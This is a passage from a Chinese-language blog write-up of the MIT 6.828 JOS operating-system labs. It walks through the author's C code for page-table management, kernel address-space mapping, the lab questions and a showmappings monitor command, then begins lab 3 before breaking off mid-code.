href="#page-lookup-：返回虚拟地址对应-PageInfo-地址" class="headerlink" title="page_lookup()：返回虚拟地址对应 PageInfo 地址"></a>page_lookup()：返回虚拟地址对应 PageInfo 地址</h4><p>主要是让我们查找页表，返回虚拟地址对应的 PageInfo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Return the page mapped at virtual address &#x27;va&#x27;.</span><br><span class="hljs-comment">// If pte_store is not zero, then we store in it the address</span><br><span class="hljs-comment">// of the pte for this page.  This is used by page_remove and</span><br><span class="hljs-comment">// can be used to verify page permissions for syscall arguments,</span><br><span class="hljs-comment">// but should not be used by most callers.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Return NULL if there is no page mapped at va.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: the TA solution uses pgdir_walk and pa2page.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>直接用前面写的 <code>pgdir_walk()</code> 找到页表项再用 <code>pa2page()</code> 把物理地址转成 PageInfo 的虚拟地址即可，JOS 还提供了一个方便的页表项到物理地址转化的宏 <code>PTE_ADDR()</code> （一开始笔者都是纯手写…）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> PageInfo *<br><span class="hljs-title function_">page_lookup</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-type">void</span> *va, <span class="hljs-type">pte_t</span> **pte_store)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><br><span class="hljs-type">pte_t</span> *pte;<br><br>pte = pgdir_walk(pgdir, va, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (pte_store)<br>*pte_store = pte;<br>    <br>    <span class="hljs-comment">// page not present</span><br><span class="hljs-keyword">if</span> (!pte || !((*pte) &amp; PTE_P))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> pa2page(PTE_ADDR(*pte));<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-remove-：解除页表虚拟地址映射"><a href="#page-remove-：解除页表虚拟地址映射" class="headerlink" title="page_remove()：解除页表虚拟地址映射"></a>page_remove()：解除页表虚拟地址映射</h4><p>主要是解除页表上对应虚拟地址到物理地址间的映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Unmaps the physical page at virtual address &#x27;va&#x27;.</span><br><span class="hljs-comment">// If there is no physical page at that address, silently does nothing.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Details:</span><br><span class="hljs-comment">//   - The ref count on the physical page should decrement.</span><br><span class="hljs-comment">//   - The physical page should be freed if the refcount reaches 0.</span><br><span class="hljs-comment">//   - The pg table entry corresponding to &#x27;va&#x27; should be set to 0.</span><br><span class="hljs-comment">//     (if such a PTE exists)</span><br><span class="hljs-comment">//   - The TLB must be invalidated if you remove an entry from</span><br><span class="hljs-comment">//     the page table.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: The TA solution is implemented using page_lookup,</span><br><span class="hljs-comment">// tlb_invalidate, and page_decref.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>清空页表项并减少引用计数即可，若引用计数为 0 则释放该页，别忘了使用 <code>tlb_invalidate()</code> 清除 TLB 中缓存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">page_remove</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-type">void</span> *va)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><br><span class="hljs-type">pte_t</span> *pte;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pp</span>;</span><br><br> <span class="hljs-comment">// get the PageInfo and PTE</span><br>pp = page_lookup(pgdir, va, &amp;pte);<br><span class="hljs-keyword">if</span> (pp)<br>&#123;<br><span class="hljs-comment">// clear PTE</span><br>tlb_invalidate(pgdir, va);<br>*pte = (<span class="hljs-type">pte_t</span>) <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// decrease refcount</span><br>page_decref(pp);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-insert-：建立虚拟地址到物理页映射"><a href="#page-insert-：建立虚拟地址到物理页映射" class="headerlink" title="page_insert()：建立虚拟地址到物理页映射"></a>page_insert()：建立虚拟地址到物理页映射</h4><p>建立单个虚拟地址到单张物理页上的映射，分配并增加页引用计数，若已有一个映射则移除现有映射并清空 TLB 对应条目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Map the physical page &#x27;pp&#x27; at virtual address &#x27;va&#x27;.</span><br><span class="hljs-comment">// The permissions (the low 12 bits) of the page table entry</span><br><span class="hljs-comment">// should be set to &#x27;perm|PTE_P&#x27;.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Requirements</span><br><span class="hljs-comment">//   - If there is already a page mapped at &#x27;va&#x27;, it should be page_remove()d.</span><br><span class="hljs-comment">//   - If necessary, on demand, a page table should be allocated and inserted</span><br><span class="hljs-comment">//     into &#x27;pgdir&#x27;.</span><br><span class="hljs-comment">//   - pp-&gt;pp_ref should be incremented if the insertion succeeds.</span><br><span class="hljs-comment">//   - The TLB must be invalidated if a page was formerly present at &#x27;va&#x27;.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Corner-case hint: Make sure to consider what happens when the same</span><br><span class="hljs-comment">// pp is re-inserted at the same virtual address in the same pgdir.</span><br><span class="hljs-comment">// However, try not to distinguish this case in your code, as this</span><br><span class="hljs-comment">// frequently leads to subtle bugs; there&#x27;s an elegant way to handle</span><br><span class="hljs-comment">// everything in one code path.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// RETURNS:</span><br><span class="hljs-comment">//   0 on success</span><br><span class="hljs-comment">//   -E_NO_MEM, if page table couldn&#x27;t be allocated</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: The TA solution is implemented using pgdir_walk, page_remove,</span><br><span class="hljs-comment">// and page2pa.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>官方推荐用 <code>page_remove()</code> 完成对现有页的解引用，但是会重复调用 <code>pgdir_walk()</code>，所以笔者直接展开操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">page_insert</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-keyword">struct</span> PageInfo *pp, <span class="hljs-type">void</span> *va, <span class="hljs-type">int</span> perm)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><span class="hljs-type">pte_t</span> *pte;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">old_pp</span>;</span><br><br> <span class="hljs-comment">// get pte of va, create it if not exist</span><br>pte = pgdir_walk(pgdir, va, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!pte)<br><span class="hljs-keyword">return</span> -E_NO_MEM;<br><br><span class="hljs-comment">// page already present, dereference it</span><br><span class="hljs-keyword">if</span> ((*pte) &amp; PTE_P)<br>&#123;<br>old_pp = pa2page(PTE_ADDR(*pte));<br><br><span class="hljs-comment">// if insert the same, just set the perm and return</span><br><span class="hljs-keyword">if</span> (old_pp == pp)<br>&#123;<br>*pte = page2pa(pp) | perm | PTE_P;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// clear PTE</span><br>tlb_invalidate(pgdir, va);<br>*pte = (<span class="hljs-type">pte_t</span>) <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// decrease refcount</span><br>page_decref(old_pp);<br>&#125;<br><br>pp-&gt;pp_ref++;<br>*pte = page2pa(pp) | perm | PTE_P;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里时运行 lab2 的分数检查程序应该有 40 分了</p><h2 id="Part-3-Kernel-Address-Space"><a href="#Part-3-Kernel-Address-Space" class="headerlink" title="Part 3: Kernel Address Space"></a>Part 3: Kernel Address Space</h2><p>kernel 占据高 256MB的虚拟地址空间而 user 使用剩余的虚拟地址空间</p><h3 id="Permissions-and-Fault-Isolation"><a href="#Permissions-and-Fault-Isolation" class="headerlink" title="Permissions and Fault Isolation"></a>Permissions and Fault Isolation</h3><p>因为一张页目录表同时映射了用户空间与内核空间，因此我们需要通过页表中的权限位限制用户对一些地址空间的访问：</p><ul><li>对于 <code>ULIM</code> 往高地址的内存，用户无权访问</li><li>对于 <code>[UTOP, ULIM)</code> 这块区域的内存，用户与内核都<strong>只有只读权限</strong>，这块区域的映射将页表、PageInfo 数组等结构暴露给用户，但只有位于内核空间的映射可以写入页表与 PageInfo 数组</li></ul><h3 id="Initializing-the-Kernel-Address-Space"><a href="#Initializing-the-Kernel-Address-Space" class="headerlink" title="Initializing the Kernel Address Space"></a>Initializing the Kernel Address Space</h3><p>接下来是 Exercise 5：完成 <code>mem_init()</code> 的剩余部分</p><blockquote><p><strong>Exercise 5.</strong> Fill in the missing code in <code>mem_init()</code> after the call to <code>check_page()</code>.</p><p>Your code should now pass the <code>check_kern_pgdir()</code> and <code>check_page_installed_pgdir()</code> checks.</p></blockquote><h4 id="mem-init-：（part2）"><a href="#mem-init-：（part2）" class="headerlink" title="mem_init()：（part2）"></a>mem_init()：（part2）</h4><p>目光放回 <code>mem_init()</code>，接下来又到了该我们补全的地方：将 pages 映射到线性地址 <code>UPAGES</code> 上，新建映射的权限应为用户与内核都可读，但 pages 结构体应当为内核可读写而用户不可知，因此应当建立新的映射，这里该用上我们之前写的 <code>boot_map_region()</code> 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Now we set up virtual memory</span><br><br><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Map &#x27;pages&#x27; read-only by the user at linear address UPAGES</span><br><span class="hljs-comment">// Permissions:</span><br><span class="hljs-comment">//    - the new image at UPAGES -- kernel R, user R</span><br><span class="hljs-comment">//      (ie. perm = PTE_U | PTE_P)</span><br><span class="hljs-comment">//    - pages itself -- kernel RW, user NONE</span><br><span class="hljs-comment">// Your code goes here:</span><br>boot_map_region(kern_pgdir, UPAGES, <br>ROUNDUP(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> PageInfo) * npages, PGSIZE), PADDR(pages), <br>PTE_U);<br></code></pre></td></tr></table></figure><p>然后到初始化内核栈了，这里内核栈被分为两块：</p><ul><li>常规的可读写内核栈</li><li>内核栈保护页面，读写到该页面上时说明栈爆了，称为 guard page</li></ul><p>guard page 不需要我们建立新的映射，因为如果爆栈了读写到 guard page 自然会触发 page fault，这时我们便知道爆栈了</p><p>需要注意内核栈应仅为内核可读写，应设置页表项的 Supervisor 权限位，即不使用 <code>PTE_U</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Use the physical memory that &#x27;bootstack&#x27; refers to as the kernel</span><br><span class="hljs-comment">// stack.  The kernel stack grows down from virtual address KSTACKTOP.</span><br><span class="hljs-comment">// We consider the entire range from [KSTACKTOP-PTSIZE, KSTACKTOP)</span><br><span class="hljs-comment">// to be the kernel stack, but break this into two pieces:</span><br><span class="hljs-comment">//     * [KSTACKTOP-KSTKSIZE, KSTACKTOP) -- backed by physical memory</span><br><span class="hljs-comment">//     * [KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE) -- not backed; so if</span><br><span class="hljs-comment">//       the kernel overflows its stack, it will fault rather than</span><br><span class="hljs-comment">//       overwrite memory.  Known as a &quot;guard page&quot;.</span><br><span class="hljs-comment">//     Permissions: kernel RW, user NONE</span><br><span class="hljs-comment">// Your code goes here:</span><br>boot_map_region(kern_pgdir, KSTACKTOP - KSTKSIZE, KSTKSIZE, <br>PADDR(bootstack), PTE_W);<br></code></pre></td></tr></table></figure><p>最后是建立内核空间的映射，将高虚拟地址处的内核映射到物理地址起始处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Map all of physical memory at KERNBASE.</span><br><span class="hljs-comment">// Ie.  the VA range [KERNBASE, 2^32) should map to</span><br><span class="hljs-comment">//      the PA range [0, 2^32 - KERNBASE)</span><br><span class="hljs-comment">// We might not have 2^32 - KERNBASE bytes of physical memory, but</span><br><span class="hljs-comment">// we just set up the mapping anyway.</span><br><span class="hljs-comment">// Permissions: kernel RW, user NONE</span><br><span class="hljs-comment">// Your code goes here:</span><br>boot_map_region(kern_pgdir, KERNBASE,<br>ROUNDUP(<span class="hljs-number">0xffffffff</span> - KERNBASE, PGSIZE), <br><span class="hljs-number">0</span>, PTE_W);<br></code></pre></td></tr></table></figure><p>完成这一切之后运行分数判断程序，全部通过，至此，lab2 的所有编程练习完美通过</p><p><img src="https://s2.loli.net/2022/03/15/IGJUqd92siweVzg.png" alt="image.png"></p><p>下面是习题 Time</p><blockquote><p><strong>Question</strong></p><ol><li><p>What entries (rows) in the page directory have been filled in at this point? What addresses do they map and where do they point? In other words, fill out this table as much as possible:</p><table><thead><tr><th>Entry</th><th>Base Virtual Address</th><th>Points to (logically):</th></tr></thead><tbody><tr><td>1023</td><td>?</td><td>Page table for top 4MB of phys memory</td></tr><tr><td>1022</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>2</td><td>0x00800000</td><td>?</td></tr><tr><td>1</td><td>0x00400000</td><td>?</td></tr><tr><td>0</td><td>0x00000000</td><td>[see next question]</td></tr></tbody></table><p><del>破题🐕都不做</del></p></li><li><p>We have placed the kernel and user environment in the same address space. Why will user programs not be able to read or write the kernel’s memory? What specific mechanisms protect the kernel memory?</p><p>由于页表项相关权限位的存在，导致用户进程（运行在 ring3）无法读写内核的内存空间，内存分页机制保护了内核内存</p></li><li><p>What is the maximum amount of physical memory that this operating system can support? Why?</p><p>操作系统最大可支持的物理内存应当为 4GB，这是一个 32 位长度的地址能够表示的范围上限</p></li><li><p>How much space overhead is there for managing memory, if we actually had the maximum amount of physical memory? How is this overhead broken down?</p><p><del>看不懂题目，摸了！</del>对于页表结构而言，一个二级页表刚好能满载 4GB 空间，需要一张页目录表与 1024 张页表，总计 <code>4198400</code> 字节空间；对于 PageInfo 结构体数组而言，一个 PageInfo 结构体占用的空间为 8 字节（4 字节对齐），那么要管理 4GB 的空间总计需要 <code>1048576</code> 个 PageInfo 结构体，占据 <code>8388608</code> 字节的空间；两者总计消耗 0.29% 的内存空间，笔者认为这个开销还是挺小的</p></li><li><p>Revisit the page table setup in <code>kern/entry.S</code> and <code>kern/entrypgdir.c</code>. Immediately after we turn on paging, EIP is still a low number (a little over 1MB). At what point do we transition to running at an EIP above KERNBASE? What makes it possible for us to continue executing at a low EIP between when we enable paging and when we begin running at an EIP above KERNBASE? Why is this transition necessary?</p><p>因为在启用分页之后低 1MB 的线性空间仍然映射到低 1MB 的物理空间，因此此时仍能正常运行；在 <code>call i386_init</code> 时跳转到 <code>kern/init.c</code> 中的 <code>i386_init()</code> 函数，此时 eip 便位于内核虚拟地址空间中了；在页表中建立双重映射；因为在开启分页之后 eip 暂时还运行在低地址空间，因此要先有个临时的双重映射保证进入内核虚拟地址空间之前的正常运行</p></li></ol></blockquote><p>接下来是选做部分：MIT 6.828 的 Challenge</p><blockquote><p><em>Challenge!</em> We consumed many physical pages to hold the page tables for the KERNBASE mapping. Do a more space-efficient job using the PTE_PS (“Page Size”) bit in the page directory entries. This bit was <em>not</em> supported in the original 80386, but is supported on more recent x86 processors. You will therefore have to refer to <a href="https://pdos.csail.mit.edu/6.828/2018/readings/ia32/IA32-3A.pdf">Volume 3 of the current Intel manuals</a>. Make sure you design the kernel to use this optimization only on processors that support it!</p></blockquote><p>这个 challenge 的意思大概就是开启 4MB 的大页，这首先需要我们修改 Cr4 寄存器，设置 <strong>Page-Size Extensions</strong> 标志位为 1 后内存页的大小就从 4KB 变成了 4MB，还需要设置页表项的 <code>PTE_PS</code> 位，主要都是苦力活这里就先摸了（</p><p>下一个 Challenge，新增一个 <code>showmappings</code> 命令：</p><blockquote><p><em>Challenge!</em> Extend the JOS kernel monitor with commands to:</p><ul><li>Display in a useful and easy-to-read format all of the physical page mappings (or lack thereof) that apply to a particular range of virtual&#x2F;linear addresses in the currently active address space. For example, you might enter <code>&#39;showmappings 0x3000 0x5000&#39;</code> to display the physical page mappings and corresponding permission bits that apply to the pages at virtual addresses 0x3000, 0x4000, and 0x5000.</li><li>Explicitly set, clear, or change the permissions of any mapping in the current address space.</li><li>Dump the contents of a range of memory given either a virtual or physical address range. Be sure the dump code behaves correctly when the range extends across page boundaries!</li><li>Do anything else that you think might be useful later for debugging the kernel. (There’s a good chance it will be!)</li></ul></blockquote><p>使用 strtol 将字符串转为数字后使用 <code>page_lookup()</code> 查阅页表后打印即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">mon_show_mapping</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br><span class="hljs-type">uintptr_t</span> vstart, vend;<br><span class="hljs-type">pte_t</span>*pte;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pp</span>;</span><br><br><span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">3</span>)<br>&#123;<br>cprintf(<span class="hljs-string">&quot;Usage: showmappings addr_start addr_end\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>vstart = strtol(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>vend = strtol(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (vstart &gt; vend)<br>&#123;<br>cprintf(<span class="hljs-string">&quot;Invalid start or end address!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>cprintf(<span class="hljs-string">&quot;Virtual address\t\tPhysical Address\n&quot;</span>);<br><span class="hljs-keyword">for</span> (; vstart &lt;= vend; vstart += PGSIZE)<br>&#123;<br>cprintf(<span class="hljs-string">&quot;  %010p\t\t &quot;</span>, vstart);<br>pp = page_lookup(kern_pgdir, (<span class="hljs-type">void</span>*) vstart, &amp;pte);<br><span class="hljs-keyword">if</span> (!pte)<br>cprintf(<span class="hljs-string">&quot; Not mapped yet.\n&quot;</span>);<br><span class="hljs-keyword">else</span><br>cprintf(<span class="hljs-string">&quot;  %010p\n&quot;</span>, page2pa(pp));<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>效果如下所示</p><p><img src="https://s2.loli.net/2022/03/16/Zz7vt2aeMJlUGVD.png" alt="image.png"></p><h3 id="Address-Space-Layout-Alternatives"><a href="#Address-Space-Layout-Alternatives" class="headerlink" title="Address Space Layout Alternatives"></a>Address Space Layout Alternatives</h3><p>当前的 JOS 内存布局并非是唯一的一种，一个操作系统还能将内核映射在线性低地址空间、而将线性高地址空间给用户进程使用，但由于 x86的一种向后兼容模式——虚拟 8086 模式将处理器“硬连线”到线性地址空间底部，因此若内核映射到此处则完全不可用</p><p>虽然这可能比想象中困难，但我们仍然有能将内核映射到低线性地址空间的方案——允许用户进程直接访问整个地址空间，但仍将内核与各进程间分割开来</p><blockquote><p>笔者评价：闲得慌</p></blockquote><p>下面是三个<del>闲得慌</del>的 Challenge：</p><blockquote><p><em>Challenge!</em> Each user-level environment maps the kernel. Change JOS so that the kernel has its own page table and so that a user-level environment runs with a minimal number of kernel pages mapped. That is, each user-level environment maps just enough pages mapped so that the user-level environment can enter and leave the kernel correctly. You also have to come up with a plan for the kernel to read&#x2F;write arguments to system calls.</p></blockquote><p>大概是给内核设置一个独立的页表，而<strong>用户进程仅保留必须用到的内核映射，例如内核入口点</strong>（比如说系统调用），笔者认为这个实现差不多是 KPTI 的思想，这里就不手抄一份 KPTI 了<del>，用户进程还啥影子都没有，写个🐓</del></p><blockquote><p><em>Challenge!</em> Write up an outline of how a kernel could be designed to allow user environments unrestricted use of the full 4GB virtual and linear address space. Hint: do the previous challenge exercise first, which reduces the kernel to a few mappings in a user environment. Hint: the technique is sometimes known as “<em>follow the bouncing kernel</em>.” In your design, be sure to address exactly what has to happen when the processor transitions between kernel and user modes, and how the kernel would accomplish such transitions. Also describe how the kernel would access physical memory and I&#x2F;O devices in this scheme, and how the kernel would access a user environment’s virtual address space during system calls and the like. Finally, think about and describe the advantages and disadvantages of such a scheme in terms of flexibility, performance, kernel complexity, and other factors you can think of.</p></blockquote><p>大概是设计与实现上面的方案，并确保自己明确其中的细节</p><blockquote><p><em>Challenge!</em> Since our JOS kernel’s memory management system only allocates and frees memory on page granularity, we do not have anything comparable to a general-purpose <code>malloc</code>&#x2F;<code>free</code> facility that we can use within the kernel. This could be a problem if we want to support certain types of I&#x2F;O devices that require <em>physically contiguous</em> buffers larger than 4KB in size, or if we want user-level environments, and not just the kernel, to be able to allocate and map 4MB <em>superpages</em> for maximum processor efficiency. (See the earlier challenge problem about PTE_PS.)</p><p>Generalize the kernel’s memory allocation system to support pages of a variety of power-of-two allocation unit sizes from 4KB up to some reasonable maximum of your choice. Be sure you have some way to divide larger allocation units into smaller ones on demand, and to coalesce multiple small allocation units back into larger units when possible. Think about the issues that might arise in such a system.</p></blockquote><p>完善内核内存管理系统，提供更大粒度与更小粒度的 allocator（比如说 buddy system + slub allocator），这里就不手抄一份 buddy system 和 slub allocator 了，笔者暂时也没有更好的内存分配方案</p><blockquote><p><del>👴是懒🐕👴自豪</del></p></blockquote><p>至此，lab2 全部完成</p><h1 id="0x03-User-Environments"><a href="#0x03-User-Environments" class="headerlink" title="0x03.User Environments"></a>0x03.User Environments</h1><p>在这一部分我们终于要迈入用户进程的世界，实现特权级的分离，并完成系统调用的编写以及一个用户进程的运行</p><p><strong>注意</strong>：本 lab 中 <code>environment</code> 与 <code>process</code> 代指同一事物——运行的进程的抽象体，6.828 在这里更多使用 environment 而不是 process 是为了指出 JOS environment 与 UNIX process 提供了不同的接口，且不提供相同的语义</p><p>首先是惯例地将 lab 3代码拉到本地</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&#x27;changes to lab2 after handin&#x27;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab3 origin/lab3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab2</span><br></code></pre></td></tr></table></figure><blockquote><p>这里笔者本想先跑一跑内核玩玩，但是遇到一个奇怪的问题：在分配页目录表地址空间后、建立映射时会 panic 掉，经笔者调试发现在 boot_alloc() 中初始化 nextfree 的值所指向的那张内存页上<strong>仍然存在着一些内核变量，即这并非是一个闲置的内存页</strong>，于是我们的指向页目录表的指针就被 memset 清零了…</p><p>为什么？让我们将目光放回 <code>boot_alloc()</code> 函数中，在我们初始化 nextfree 时使用的是一个外部引入的变量 <code>end</code> 对内存页进行向上对齐得到的地址，这里说是由链接器生成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Initialize nextfree if this is the first time.</span><br><span class="hljs-comment">// &#x27;end&#x27; is a magic symbol automatically generated by the linker,</span><br><span class="hljs-comment">// which points to the end of the kernel&#x27;s bss segment:</span><br><span class="hljs-comment">// the first virtual address that the linker did *not* assign</span><br><span class="hljs-comment">// to any kernel code or global variables.</span><br><span class="hljs-keyword">if</span> (!nextfree) &#123;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> end[];<br>nextfree = ROUNDUP((<span class="hljs-type">char</span> *) end, 